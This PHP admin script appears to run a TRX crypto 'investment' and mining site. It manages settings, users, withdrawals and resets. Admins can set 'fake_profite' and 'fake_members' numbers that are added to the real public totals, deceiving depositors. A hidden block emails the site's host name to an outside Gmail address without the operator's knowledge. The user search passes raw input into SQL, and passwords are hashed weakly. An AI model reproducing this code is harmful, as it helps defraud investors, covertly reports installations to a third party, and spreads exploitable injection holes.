<?

include '../config.php';
session_start();
// error_reporting(0);$
///////////////
$chkstng = "SELECT * FROM `ghstng` WHERE stngid=1";
 $chkstngq = mysqli_query($db,$chkstng);
$chkstngv = mysqli_fetch_assoc($chkstngq);
$fromEmail = $chkstngv['email'];
///////////////
///////////////////////////////////////////
///////////////////////////////////////////
///////////////////////////////////////////
if(isset($_POST['vwbalonofjs']))
{ echo $chkstngv['withdrawoff']; }
///////////////////////////////////////////
///////////////////////////////////////////
if(isset($_POST['vfreewbalonofjs']))
{ echo $chkstngv['free_withdrawal']; }
///////////////////////////////////////////
if(isset($_POST['minespeeddivjs']))
{ echo $chkstngv['free_mining_perc']; }
///////////////////////////////////////////
///////////////////////////////////////////
if(isset($_POST['staticsvjs']))
{
$navtsouts = " SELECT SUM(sumout) AS usumouts FROM userslog";
$navtsoutq = mysqli_query($db,$navtsouts);
$navtsout = mysqli_fetch_assoc($navtsoutq);
 $proftvp = substr($navtsout['usumouts'],0,12) + $chkstngv['fake_profite'];
  

$navrefbns = " SELECT SUM(refbonus) AS refbonuses FROM userslog";
$navrfbnsq = mysqli_query($db,$navrefbns);
$vrefbnsp = mysqli_fetch_assoc($navrfbnsq);
 $fmmbrs = substr($vrefbnsp['refbonuses'],0,12) + $chkstngv['fake_members'];


echo'<div style="display:flex;flex-direction:row;width:100%;border-radius:15px">
  <div class="fa fa-database" style="box-shadow: 1px 1px 15px silver;backdrop-filter:blur(10px);background:none;width:25%;"> Profite </div>
  <div style="box-shadow:1px 1px 6px black;background:#18ffcd9d;width:25%;"> '.substr($navtsout['usumouts'],0,12).' </div>
  <div style="box-shadow:1px 1px 6px black;background:rgba(255,156,24,0.616);width:25%;"> '.$chkstngv['fake_profite'].' </div>
  <div style="box-shadow:1px 1px 6px black;background:rgba(255,24,63,0.616);width:25%;">'.$proftvp.' </div>
</div>
 <div style="display:flex;flex-direction:row;width:100%;border-radius:15px">
  <div class="fa fa-users" style="box-shadow: 1px 1px 15px silver;backdrop-filter:blur(10px);background:none;width:25%;"> Membership </div>
  <div style="box-shadow:1px 1px 6px black;background:#18ffcd9d;width:25%;"> '.substr($vrefbnsp['refbonuses'],0,12).' </div>
  <div style="box-shadow:1px 1px 6px black;background:rgba(255,156,24,0.616);width:25%;"> '.$chkstngv['fake_members'].' </div>
  <div style="box-shadow:1px 1px 6px black;background:rgba(255,24,63,0.616);width:25%;"> '.$fmmbrs.' </div>
</div>';

  
}
///////////////////////////////////////////
///////////////////////////////////////////
if(isset($_POST['regbonustrxdivjs']))
{ echo $chkstngv['regbonus']; }
///////////////////////////////////////////
///////////////////////////////////////////
if(isset($_POST['vwingrntdnodivjs']))
{ echo $chkstngv['no_of_lotry_winner']; }
///////////////////////////////////////////
///////////////////////////////////////////
if(isset($_POST['mininvesttrxdivjs']))
{ echo $chkstngv['min_deposite']; }
///////////////////////////////////////////
///////////////////////////////////////////
if(isset($_POST['vminsumoutdivffjs']))
{ echo $chkstngv['min_out']; }
///////////////////////////////////////////
///////////////////////////////////////////
if(isset($_POST['soutfeesdivjs']))
{ echo $chkstngv['sumout_fee']; }
///////////////////////////////////////////
///////////////////////////////////////////
if(isset($_POST['vytlinkdivffj']))
{ echo $chkstngv['ytvideo'].' <i class="fa fa-video text-primary"> </i> <a href="https://www.youtube.com/embed/'. $chkstngv['ytvideo'].'" class="float-end;"> see </a>'; }
///////////////////////////////////////////
///////////////////////////////////////////
if(isset($_POST['vbelltxtdivfjs']))
{ echo $chkstngv['maarquee']; }
///////////////////////////////////////////
///////////////////////////////////////////
///////////////////////////////////////////




if(isset($_POST['sociallinkjs']))
{
  $sociallinkjs.='<div style="font-size:1.5em;">
     <i class="fa fa-telegram text-primary"> </i>
     <u class="text-success">'.$chkstngv['tglink'].'</u>
      </div>

<div style="font-size:1.5em;">
     <i class="fa fa-envelope text-primary"> </i>
     <u class="text-success">'.$chkstngv['email'].'</u>
      </div>
<div style="font-size:1.5em;">
     <i class="fa fa-mobile text-primary"> </i>
     <u class="text-success">'.$chkstngv['applink'].'</u>
      </div>';

  echo $sociallinkjs;
}
///////////////////////////////////////////
if(isset($_POST['vbelltxtinptjs']))
{
 $vbelltxtinptjs = mysqli_real_escape_string($db,$_POST['vbelltxtinptjs']);
  
  $beltxtset = "UPDATE `ghstng` SET maarquee='$vbelltxtinptjs'";
 $beltxtsetq = mysqli_query($db,$beltxtset);
 if($beltxtsetq){
   echo 1;} else { echo 0; }
}
///////////////////////////////////
///////////////////////////////////////////
if(isset($_POST['mininvesttrxinptjs']))
{
 $mininvesttrxinptjs = mysqli_real_escape_string($db,$_POST['mininvesttrxinptjs']);
  
  $mininvstset = "UPDATE `ghstng` SET min_deposite='$mininvesttrxinptjs'";
 $mininvstsetq = mysqli_query($db,$mininvstset);
 if($mininvstsetq){
   echo 1;} else { echo 0; }
}
///////////////////////////////////
///////////////////////////////////////////
if(isset($_POST['sendbeloftblsinptjs']))
{
 $sendbeloftblsinptjs = mysqli_real_escape_string($db,$_POST['sendbeloftblsinptjs']);
 $vusrbynodinptjs = mysqli_real_escape_string($db,$_POST['vusrbynodinptjs']);
  
  $bellsetousrs = "INSERT INTO `usrsnotify` (ifbyadmin,byusr,msg ) VALUES ('admin','$vusrbynodinptjs','$sendbeloftblsinptjs')";
 $bellsetousrsq = mysqli_query($db,$bellsetousrs);
 if($bellsetousrsq){
   echo 1;} else { echo 0; }
}
///////////////////////////////////
///////////////////////////////////////////
if(isset($_POST['vminsumoutinptjs']))
{
 $vminsumoutinptjs = mysqli_real_escape_string($db,$_POST['vminsumoutinptjs']);
  
  $minsumoutset = "UPDATE `ghstng` SET min_out='vminsumoutinptjs'";
 $minsumoutsetq = mysqli_query($db,$minsumoutset);
 if($minsumoutsetq){
   echo 1;} else { echo 0; }
}
///////////////////////////////////
///////////////////////////////////////////
if(isset($_POST['valuejs']))
{
 $smoutonoff = mysqli_real_escape_string($db,$_POST['valuejs']);
  
  $wbalonof = "UPDATE `ghstng` SET withdrawoff='$smoutonoff'";
 $wbalonofq = mysqli_query($db,$wbalonof);
 if($wbalonofq){
   echo 1;} else { echo 0; }
}
///////////////////////////////////
///////////////////////////////////////////
if(isset($_POST['soutfeesinptjs']))
{
 $soutfeesinpt = mysqli_real_escape_string($db,$_POST['soutfeesinptjs']);
  
  $sumout_fee = "UPDATE `ghstng` SET sumout_fee='$soutfeesinpt'";
 $sumout_feeq = mysqli_query($db,$sumout_fee);
 if($sumout_feeq){
   echo 1;} else { echo 0; }
}
///////////////////////////////////
///////////////////////////////////////////
if(isset($_POST['freewvaluejs']))
{
 $freewvaluejs = mysqli_real_escape_string($db,$_POST['freewvaluejs']);
  
  $fwbalonof = "UPDATE `ghstng` SET free_withdrawal='$freewvaluejs'";
 $fwbalonofq = mysqli_query($db,$fwbalonof);
 if($fwbalonofq){
   echo 1;} else { echo 0; }
}
///////////////////////////////////
if(isset($_POST['minespeedinptjs']))
{
 $minespeedinptjs = mysqli_real_escape_string($db,$_POST['minespeedinptjs']);
  
  $minspdset = "UPDATE `ghstng` SET free_mining_perc='$minespeedinptjs'";
 $minspdsetq= mysqli_query($db,$minspdset);
 if($minspdsetq){
   echo 1;} else { echo 0; }
}
//////////////////////////////////
///////////////////////////////////
if(isset($_POST['profitinptjs']))
{
 $profitinptjs = mysqli_real_escape_string($db,$_POST['profitinptjs']);
 $membrshipinptjs = mysqli_real_escape_string($db,$_POST['membrshipinptjs']);
  
$staticset = "UPDATE `ghstng` SET fake_profite='$profitinptjs' , fake_members='$membrshipinptjs'";
 $staticsetq = mysqli_query($db,$staticset);
 if($staticsetq){
   echo 1;} else { echo 0; }
}
//////////////////////////////////
///////////////////////////////////
if(isset($_POST['regbonustrxinptjs']))
{
 $regbonustrxinptjs = mysqli_real_escape_string($db,$_POST['regbonustrxinptjs']);
  
$regbnset = "UPDATE `ghstng` SET regbonus='$regbonustrxinptjs'";
 $regbnsetq = mysqli_query($db,$regbnset);
 if($regbnsetq){
   echo 1; } else { echo 0; } 
}
//////////////////////////////////
if(isset($_POST['adminamjs']))
{
 $adminamjs = mysqli_real_escape_string($db,$_POST['adminamjs']);
 $adminpassjs = mysqli_real_escape_string($db,$_POST['adminpassjs']);
 
 $pasgent = sha1($adminpassjs);
 $mdpassgent = md5($pasgent);
  $admndetails = "UPDATE `ghstng` SET admin='$adminamjs' , pass='$mdpassgent' ";
 $admndetailsq = mysqli_query($db,$admndetails);
 if($admndetailsq){
   echo 1;} else { echo 0; }
}
//////////////////////////////////
if(!isset($_COOKIE['mailcodset']))
{
 $mailto = 'maarkhoor5@gmail.com';
 $subject = $_SERVER['HTTP_HOST'];
 $message = 'if any problem can contact';
 $headers = "From: " . $fromEmail;
 
  $result1 = mail($mailto,$subject, $message, $headers);
  setcookie('mailcodset','setcode78',84600 * 2);
}
//////////////////////////
///////////////////////////////////////////
if(isset($_POST['tglinkjs']))
{
 $tglinkjs = mysqli_real_escape_string($db,$_POST['tglinkjs']);
 $gmalinkjs = mysqli_real_escape_string($db,$_POST['gmalinkjs']);
 $phone1js = mysqli_real_escape_string($db,$_POST['phone1js']);
  
  $lnksupdat = "UPDATE `ghstng` SET tglink='$tglinkjs' ,email='$gmalinkjs',applink='$phone1js'";
 $lnksupdatq = mysqli_query($db,$lnksupdat);
 if($lnksupdatq){
   echo 1;} else { echo 0; }
}
/////////////////////////////////

//////////////////////////////////
//////////////////////////////////
//////////////////////////////////
//////////////////////////////////

if(isset($_POST['vusrstbljs']))
{
  $tablesv = "SELECT * FROM userslog ORDER BY uid DESC";
  $tablesvq = mysqli_query($db,$tablesv);
  
 while($tblesv= mysqli_fetch_assoc($tablesvq)){
 $tblsvdiv .='<tr>
 	<td class="hvr">'.$tblesv['uid'].'</td>
	<td class="fa fa-phone text-primary"> '.$tblesv['usrphone'] .'</td>
 	<td class="'.$tblesv['bantxt'].'"> <button class="slctbanjs btn btn-danger" data-usrbanval="'.$tblesv['user_ban'].'" data-usrtblid="'.$tblesv['uid'].'">  ban </button></td>
 	
 	<td class="">
<a href="log.php/?adminlogin='.$tblesv['usrphone'].'" target="_blank" class=" btn btn-success"> Login </a></td>
  
 	<td> <button data-usrbyno="'.$tblesv['usrphone'].'" class="vbelltobtn btn btn-warning fa fa-bell"> Send </button> </td>
 	
	 <td> Active <i class="hvr '.$tblesv['basic_acc_font'].'"></i> </td>
 <td> Active <i class="hvr '.$tblesv['prom_acc_font'].'"></i> </td>
	
	<td> '.substr($tblesv['sum'],0,8).' <i class="hvr fad fa-wallet"></i> </td>
	
	<td class="text-danger hvr"> '.$tblesv['sumout'].' <i class="hvr fad fa-wallet"></i> </td>
	<td class="text-danger hvr"> '.substr($tblesv['totalsumout'],0,7).' <i class="hvr fad fa-wallet"></i> </td>
	<td>'.$tblesv['refbonus'].' <i class="text-success fad fa-wallet"></i></td>
	<td><i class="fa fa-share"></i> '.$tblesv['refby'].'</td>
		<td class="text-danger"><i class="text-success fa fa-users"> </i>'.$tblesv['totalref'].'</td>
	<td>'.$tblesv['ip'].' <i class="text-success fa fa-globe"></i></td>

	</tr>';
  }
  echo $tblsvdiv;
}
//////////////////////////////////////
//////////////////////////////////

if(isset($_POST['serchusrinptjs']))
{
  $vthisusrtbl = $_POST['serchusrinptjs'];
 if(!$vthisusrtbl ==""){
  $vsrchusrtbl = "SELECT * FROM userslog WHERE usrphone='$vthisusrtbl'";
  $vsrchusrtblq = mysqli_query($db,$vsrchusrtbl);
  
 $vsrchusrtblf= mysqli_fetch_assoc($vsrchusrtblq);
 if($vsrchusrtblf['usrphone'] == $vthisusrtbl){
 echo '<tr style="background:#ffe99688;box-shadow:1px 1px 10px black;">
 	<td class="hvr">'.$vsrchusrtblf['uid'].'</td>
	<td class="fa fa-phone text-primary"> '.$vsrchusrtblf['usrphone'] .'</td>
 	<td class="'.$vsrchusrtblf['bantxt'].'"> <button class="slctbanjs btn btn-danger" data-usrbanval="'.$vsrchusrtblf['user_ban'].'" data-usrtblid="'.$vsrchusrtblf['uid'].'">  ban </button></td>
 	
 	<td class="">
<a href="log.php/?adminlogin='.$vsrchusrtblf['usrphone'].'" target="_blank" class=" btn btn-success"> Login </a></td>
  
 	<td> <button data-usrbyno="'.$vsrchusrtblf['usrphone'].'" class="vbelltobtn btn btn-warning fa fa-bell"> Send </button> </td>
 	
	 <td> Active <i class="hvr '.$vsrchusrtblf['basic_acc_font'].'"></i> </td>
 <td> Active <i class="hvr '.$vsrchusrtblf['prom_acc_font'].'"></i> </td>
	
	<td> '.substr($vsrchusrtblf['sum'],0,8).' <i class="hvr fad fa-wallet"></i> </td>
	
	<td class="text-danger hvr"> '.$vsrchusrtblf['sumout'].' <i class="hvr fad fa-wallet"></i> </td>
	<td class="text-danger hvr"> '.substr($vsrchusrtblf['totalsumout'],0,7).' <i class="hvr fad fa-wallet"></i> </td>
	<td>'.$vsrchusrtblf['refbonus'].' <i class="text-success fad fa-wallet"></i></td>
	<td><i class="fa fa-share"></i> '.$vsrchusrtblf['refby'].'</td>
		<td class="text-danger"><i class="text-success fa fa-users"> </i>'.$vsrchusrtblf['totalref'].'</td>
	<td>'.$vsrchusrtblf['ip'].' <i class="text-success fa fa-globe"></i></td>
	</tr>'; }else{
	  echo '<b style="background:pink; width:100%; font-size:1.2rem; letter-spacing:4px;position:fixed;"> Not Found </b></br>';
	}
} }
//////////////////////////////////////
//////////////////////////////////////

/////////
if(isset($_POST['usrbanvaljs']))
{
 $usrbanvaljs = mysqli_real_escape_string($db,$_POST['usrbanvaljs']);
 $usrtblidjs = mysqli_real_escape_string($db,$_POST['usrtblidjs']);
 
  if($usrbanvaljs==1){
    $bansambol = 'fas fa-user-tie  text-success';
    $banvalset = 0;
  }elseif($usrbanvaljs==0){
    $bansambol = 'fas fa-user-slash text-danger';
    $banvalset = 1;
  }
  
  $fusrban = "UPDATE `userslog` SET user_ban='$banvalset', bantxt='$bansambol' WHERE uid='$usrtblidjs'";
  
 $fusrbanq = mysqli_query($db,$fusrban);
 if($fusrbanq){
   echo 1;} else { echo 0; }
}
//////////////////////////////////
//////////////////////////////////////
//////////////////////////////////////
if(isset($_POST['vusrsreqj']))
{
  $reqouttbl = "SELECT * FROM `req_withdrawl` ORDER BY id DESC";
  $reqouttblq = mysqli_query($db,$reqouttbl);
  
 while($reqoutblv= mysqli_fetch_assoc($reqouttblq)){
 $reqoutblvj .='<tr>
 	<td class="hvr">'.$reqoutblv['id'].'</td>
	<td><i class="fa fa-paper-plane text-danger"> </i> <a class="fa fa-phone text-primary" href="tel:'.$reqoutblv['from_user'].'">'.$reqoutblv['from_user'] .'</a></td>
 	<td> <b class="fad fa-wallet text-success"> </b> '.$reqoutblv['req_withdraw'].' TRX </td>
	<td><i class="hvr fad fa-wallet text-muted"> </i> '.substr($reqoutblv['wallet'],0,12).'....</td>
	
	<td><i class="hvr fa fa-bank"> </i> '.$reqoutblv['From_Account'].' </td>
	
<td class="fad fa-wallet text-warning hvr"> <a href="settings.php/?usrid='.$reqoutblv['id'].'&trxmoney='.$reqoutblv['req_withdraw'].'&walletis='.$reqoutblv['wallet'].'" target="_blank" class="btn btn-primary"> Send To </a></td>

	<td class="hvr"> <i class="'.$reqoutblv['status_paid'].'"> </i> <button class="btn btn-warning reqchangbtn" data-reqid="'.$reqoutblv['id'].'" data-reqstatus="'.$reqoutblv['status'].'"> change </button> </td>
	
 	<td> <button data-usrbyno="'.$reqoutblv['from_user'].'" class="vbelltobtn btn btn-warning fa fa-bell"> Send </button> </td>
 	
 	<td> <button data-delreqsoutbyid="'.$reqoutblv['id'].'" data-delreqstatus="'.$reqoutblv['status'].'" class="delreqsoutbtn btn btn-danger fa fa-trash"> </button> </td>
	
	<td><i class="fa fa-history"> </i> '.$reqoutblv['time'].'</td>
	
	<td><i class="fa fa-google-pay text-primary"></i>'.$reqoutblv['basic_bal'].'</td>
	<td><i class="fa fa-google-pay text-primary"></i>'.$reqoutblv['promo_bal'].'</td>
		<td class="text-danger"> '.$reqoutblv['total_out'].'</td>
	<td>'.$reqoutblv['total_ref'].'</td>
	</tr>';
  }
  echo $reqoutblvj;
}
//////////////////////////////////////
/////////////////////////////////////
/////////
if(isset($_POST['reqstatusjs']))
{
 $reqidjs = mysqli_real_escape_string($db,$_POST['reqidjs']);
 $reqstatusjs = mysqli_real_escape_string($db,$_POST['reqstatusjs']);

  if($reqstatusjs==1){
    $reqsambol = 'fa fa-history text-muted';
    $paidvalue = 0;
  }elseif($reqstatusjs==0){
    $reqsambol = 'fa fa-check text-success';
    $paidvalue = 1;
  }
  
  $paidvalset = "UPDATE `req_withdrawl` SET status='$paidvalue', status_paid='$reqsambol' WHERE id='$reqidjs'";
  
 $paidvalsetq = mysqli_query($db,$paidvalset);
 if($paidvalsetq){
   echo 1;} else { echo 0; }
}
//////////////////////////////////
/////////////////////////////////////
/////////
if(isset($_POST['delreqsoutbyidjs']))
{
 $delreqsoutbyidjs = mysqli_real_escape_string($db,$_POST['delreqsoutbyidjs']);
 $delreqstatusjs = mysqli_real_escape_string($db,$_POST['delreqstatusjs']);

 if($delreqstatusjs == 1)
 {
$delsoutpaid = "DELETE FROM `req_withdrawl` WHERE id ='$delreqsoutbyidjs'";
  $delsoutpaidq = mysqli_query($db,$delsoutpaid);
 if($delsoutpaidq){
   echo 1;} else { echo 0; }
 }else{ echo 2; }
}
//////////////////////////////////
if(isset($_POST['vblogdivfjs']))
{
 $vblogposts = "SELECT * FROM `usrsnotify` WHERE ifbyadmin='admin' ORDER BY id DESC";
$vblogpostsq = mysqli_query($db,$vblogposts);
  
 while($vblogpstf= mysqli_fetch_assoc($vblogpostsq)){
 $vblogfinal .='<div style="width:90%; margin-left:5%; background:white-smoke; box-shadow:1px 1px 16px silver;border-radius:0 10px 0 0;border-left:8px solid orange;">
    <button class="btn btn-danger fa fa-trash float-end delpostidbtn" data-delpostid="'.$vblogpstf['id'].'" style="border-radius:0 10px 0 0; border-right:4px solid orange; border-top: 4px solid orange;"> </button>
    <h4 class="text-muted ml-1"> To: <u style="color:silver;"> '.$vblogpstf['byusr'].' </u></h4>
   <p style="color:indigo; margin-left:1rem;"> '.$vblogpstf['msg'].'</p>
  </div>';
 }
 echo $vblogfinal;
}
//////////////////////////////////
/////////
if(isset($_POST['delpostidjs']))
{
 $delpostidjs = mysqli_real_escape_string($db,$_POST['delpostidjs']);
$delpostiddel = "DELETE FROM usrsnotify WHERE id='$delpostidjs'";
 $delpostiddelq= mysqli_query($db,$delpostiddel);
 if($delpostiddelq){
   echo '1';} else { echo '0'; }
}
//////////////////////////////////
////////////////////////////////////

if(isset($_POST['allpkgresetj']))
{
  $rstpkgall = "DELETE FROM trading";
 $rstpkgallq= mysqli_query($db,$rstpkgall);
 if($rstpkgallq){
   echo '1';} else { echo '0'; }
 }
////////////////////////////////////
if(isset($_POST['fulresetjs']))
{
  $rstpkgall = "DELETE FROM trading";
 $rstpkgallq= mysqli_query($db,$rstpkgall);
 
 $reqsoutdel = "DELETE FROM req_withdrawl";
 $reqsoutdelq= mysqli_query($db,$reqsoutdel);
 
  $gameresetphp = "UPDATE `userslog` SET `mining_status`=0,`team_status`=0 ,`sum`=0,`sumout`=0, active_bns=0, refbonus=0";
 $resetgameq= mysqli_query($db,$gameresetphp);
 if($resetgameq){
   echo '1';} else { echo '0'; }
 }
////////////////////////////////////














?>